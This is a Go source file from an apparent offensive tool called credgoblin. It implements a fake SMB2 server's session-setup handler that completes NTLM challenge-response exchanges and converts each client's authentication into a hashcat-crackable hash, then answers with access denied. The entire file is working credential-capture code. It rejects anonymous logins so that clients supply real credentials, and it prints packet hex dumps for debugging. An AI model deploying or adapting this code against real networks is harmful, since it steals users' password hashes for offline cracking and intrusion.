package smb

import (
	"bytes"
	"encoding/binary"
	"fmt"

	"github.com/ineffectivecoder/credgoblin/pkg/ntlm"
)

// SMB2 Session Setup Response Status
const (
	STATUS_SUCCESS                  = 0x00000000
	STATUS_MORE_PROCESSING_REQUIRED = 0xC0000016
	STATUS_LOGON_FAILURE            = 0xC000006D
	STATUS_ACCESS_DENIED            = 0xC0000022
)

// SessionState tracks state for a session
type SessionState struct {
	Challenge *ntlm.ChallengeMessage
}

// buildSessionSetupResponse builds an SMB2 SESSION_SETUP response
func buildSessionSetupResponse(req *SMB2Header, status uint32, sessionID uint64, securityBlob []byte) []byte {
	headerSize := 64
	bodySize := 9 // StructureSize(2) + SessionFlags(2) + SecurityBufferOffset(2) + SecurityBufferLength(2) + Reserved(1)
	totalSize := headerSize + bodySize + len(securityBlob)

	response := make([]byte, totalSize)
	offset := 0

	// SMB2 Header
	copy(response[offset:offset+4], []byte{0xFE, 'S', 'M', 'B'})
	offset += 4
	binary.LittleEndian.PutUint16(response[offset:offset+2], 64)
	offset += 2
	binary.LittleEndian.PutUint16(response[offset:offset+2], 1)
	offset += 2
	binary.LittleEndian.PutUint32(response[offset:offset+4], status)
	offset += 4
	binary.LittleEndian.PutUint16(response[offset:offset+2], SMB2_SESSION_SETUP)
	offset += 2
	binary.LittleEndian.PutUint16(response[offset:offset+2], 1)
	offset += 2
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0x00000001)
	offset += 4
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0)
	offset += 4
	binary.LittleEndian.PutUint64(response[offset:offset+8], req.MessageID)
	offset += 8
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0)
	offset += 4
	binary.LittleEndian.PutUint32(response[offset:offset+4], req.TreeID)
	offset += 4
	binary.LittleEndian.PutUint64(response[offset:offset+8], sessionID)
	offset += 8
	offset += 16

	// SMB2 SESSION_SETUP Response body
	binary.LittleEndian.PutUint16(response[offset:offset+2], 9) // StructureSize (must be 9)
	offset += 2
	binary.LittleEndian.PutUint16(response[offset:offset+2], 0) // SessionFlags
	offset += 2
	binary.LittleEndian.PutUint16(response[offset:offset+2], uint16(headerSize+bodySize)) // SecurityBufferOffset (64+9=73)
	offset += 2
	binary.LittleEndian.PutUint16(response[offset:offset+2], uint16(len(securityBlob))) // SecurityBufferLength
	offset += 2
	response[offset] = 0 // Reserved byte
	offset += 1

	copy(response[offset:], securityBlob)

	// Debug output
	fmt.Printf("[DBG] Sending SESSION_SETUP response: status=0x%08x sessionID=0x%016x blobLen=%d\n", status, sessionID, len(securityBlob))

	return response

	return response
}

// wrapNTLMInSPNEGO wraps an NTLM message in SPNEGO
func wrapNTLMInSPNEGO(ntlmMsg []byte, isChallenge bool) []byte {
	if isChallenge {
		// NegTokenTarg with negResult, supportedMech, and responseToken
		// a1 [NegTokenTarg]
		//   30 [SEQUENCE]
		//     a0 [0] negResult = accept-incomplete (1)
		//     a1 [1] supportedMech = NTLMSSP OID
		//     a2 [2] responseToken = NTLM Type 2

		// NTLMSSP OID: 1.3.6.1.4.1.311.2.2.10
		ntlmsspOID := []byte{0x06, 0x0a, 0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x0a}

		// negResult
		negResult := []byte{0xa0, 0x03, 0x0a, 0x01, 0x01} // accept-incomplete

		// supportedMech
		supportedMech := append([]byte{0xa1}, encodeLength(len(ntlmsspOID))...)
		supportedMech = append(supportedMech, ntlmsspOID...)

		// responseToken
		octetString := append([]byte{0x04}, encodeLength(len(ntlmMsg))...)
		octetString = append(octetString, ntlmMsg...)
		responseToken := append([]byte{0xa2}, encodeLength(len(octetString))...)
		responseToken = append(responseToken, octetString...)

		// SEQUENCE containing all three
		sequenceContent := append(negResult, supportedMech...)
		sequenceContent = append(sequenceContent, responseToken...)
		sequence := append([]byte{0x30}, encodeLength(len(sequenceContent))...)
		sequence = append(sequence, sequenceContent...)

		// NegTokenTarg wrapper
		negTokenTarg := append([]byte{0xa1}, encodeLength(len(sequence))...)
		negTokenTarg = append(negTokenTarg, sequence...)

		return negTokenTarg
	}

	return ntlmMsg
}

// unwrapSPNEGO extracts NTLM message from SPNEGO wrapper
func unwrapSPNEGO(data []byte) ([]byte, error) {
	// Check for empty blob
	if len(data) == 0 {
		return nil, fmt.Errorf("empty SPNEGO blob")
	}

	// First check if it's already raw NTLM (starts with NTLMSSP)
	ntlmSig := []byte("NTLMSSP\x00")
	if len(data) >= 8 && bytes.Equal(data[0:8], ntlmSig) {
		return data, nil
	}

	// Try to find NTLMSSP signature in SPNEGO wrapper
	idx := bytes.Index(data, ntlmSig)
	if idx != -1 {
		return data[idx:], nil
	}

	// If not found, it might be Kerberos or other mechanism
	// Check for SPNEGO NegTokenInit (0x60) or NegTokenTarg (0xa1)
	if data[0] == 0x60 || data[0] == 0xa0 || data[0] == 0xa1 {
		// This is likely SPNEGO but not NTLM - could be Kerberos
		// For hash capture, we need NTLM, so return error
		return nil, fmt.Errorf("SPNEGO contains non-NTLM mechanism (possibly Kerberos)")
	}

	return nil, fmt.Errorf("NTLM message not found in SPNEGO blob (len=%d, first byte=0x%02x)", len(data), data[0])
}

// encodeLength encodes a length in DER format
func encodeLength(length int) []byte {
	if length < 128 {
		return []byte{byte(length)}
	}

	var buf bytes.Buffer
	numBytes := 0
	temp := length
	for temp > 0 {
		numBytes++
		temp >>= 8
	}

	buf.WriteByte(0x80 | byte(numBytes))
	for i := numBytes - 1; i >= 0; i-- {
		buf.WriteByte(byte(length >> (i * 8)))
	}

	return buf.Bytes()
}

// getLengthBytes returns the number of bytes needed to encode a length
func getLengthBytes(length int) int {
	if length < 128 {
		return 1
	}

	numBytes := 1
	temp := length
	for temp > 0 {
		numBytes++
		temp >>= 8
	}

	return numBytes
}

// handleSessionSetup handles an SMB2 SESSION_SETUP request
func handleSessionSetup(
	req *SMB2Header,
	data []byte,
	challengeGen *ntlm.Challenge,
	authParser *ntlm.AuthMessageParser,
	hashFormatter *ntlm.HashcatFormatter,
	state *SessionState,
) ([]byte, string, error) {
	if len(data) < 64+9 {
		return nil, "", fmt.Errorf("session setup request too short")
	}

	offset := 64
	structureSize := binary.LittleEndian.Uint16(data[offset : offset+2])
	if structureSize != 25 {
		return nil, "", fmt.Errorf("invalid structure size: %d", structureSize)
	}
	offset += 2
	// Skip Flags (1), SecurityMode (1), Capabilities (4), Channel (4) = 10 bytes to reach SecurityBufferOffset at offset 12 in body
	offset += 10

	securityBufferOffset := binary.LittleEndian.Uint16(data[offset : offset+2])
	offset += 2
	securityBufferLength := binary.LittleEndian.Uint16(data[offset : offset+2])

	// Debug: print first 200 bytes of the session setup request
	debugLen := len(data)
	if debugLen > 200 {
		debugLen = 200
	}
	var hexDump string
	for i := 0; i < debugLen; i++ {
		if i%16 == 0 {
			hexDump += fmt.Sprintf("\n%04x: ", i)
		}
		hexDump += fmt.Sprintf("%02x ", data[i])
	}
	fmt.Printf("SESSION_SETUP packet (secBufOff=%d secBufLen=%d):%s\n", securityBufferOffset, securityBufferLength, hexDump)

	if int(securityBufferOffset)+int(securityBufferLength) > len(data) {
		return nil, "", fmt.Errorf("security buffer out of bounds")
	}

	if securityBufferLength == 0 {
		// Client is trying anonymous/guest login - send LOGON_FAILURE and close connection
		errResponse := buildSessionSetupResponse(&SMB2Header{MessageID: binary.LittleEndian.Uint64(data[56:64])}, 0xC000006D, 0, nil) // STATUS_LOGON_FAILURE
		return errResponse, "", fmt.Errorf("empty security buffer - client attempting anonymous auth, connection will close")
	}

	securityBlob := data[securityBufferOffset : securityBufferOffset+securityBufferLength]

	ntlmMsg, err := unwrapSPNEGO(securityBlob)
	if err != nil {
		// Log the first 32 bytes of the security blob for debugging
		debugLen := len(securityBlob)
		if debugLen > 32 {
			debugLen = 32
		}
		var hexDump string
		for i := 0; i < debugLen; i++ {
			hexDump += fmt.Sprintf("%02x ", securityBlob[i])
		}
		return nil, "", fmt.Errorf("failed to unwrap SPNEGO (blob hex: %s...): %w", hexDump, err)
	}

	if len(ntlmMsg) < 12 {
		return nil, "", fmt.Errorf("NTLM message too short")
	}

	msgType := binary.LittleEndian.Uint32(ntlmMsg[8:12])

	switch msgType {
	case ntlm.NtLmNegotiate:
		challenge := challengeGen.Generate()
		state.Challenge = challenge

		spnegoBlob := wrapNTLMInSPNEGO(challenge.Bytes(), true)

		// Debug: print first 100 bytes of SPNEGO blob
		debugLen := len(spnegoBlob)
		if debugLen > 100 {
			debugLen = 100
		}
		var hexDump string
		for i := 0; i < debugLen; i++ {
			if i%16 == 0 && i > 0 {
				hexDump += "\n                "
			}
			hexDump += fmt.Sprintf("%02x ", spnegoBlob[i])
		}
		fmt.Printf("[DBG] SPNEGO blob: %s\n", hexDump)

		response := buildSessionSetupResponse(req, STATUS_MORE_PROCESSING_REQUIRED, 0x1000000000001, spnegoBlob)
		return response, "", nil

	case ntlm.NtLmAuthenticate:
		auth, err := authParser.Parse(ntlmMsg)
		if err != nil {
			response := buildSessionSetupResponse(req, STATUS_LOGON_FAILURE, req.SessionID, nil)
			return response, "", fmt.Errorf("failed to parse auth message: %w", err)
		}

		var hash string
		if state.Challenge != nil {
			hash = hashFormatter.FormatHashcatFromChallenge(state.Challenge, auth)
		}

		response := buildSessionSetupResponse(req, STATUS_ACCESS_DENIED, req.SessionID, nil)
		return response, hash, nil

	default:
		return nil, "", fmt.Errorf("unsupported NTLM message type: 0x%x", msgType)
	}
}
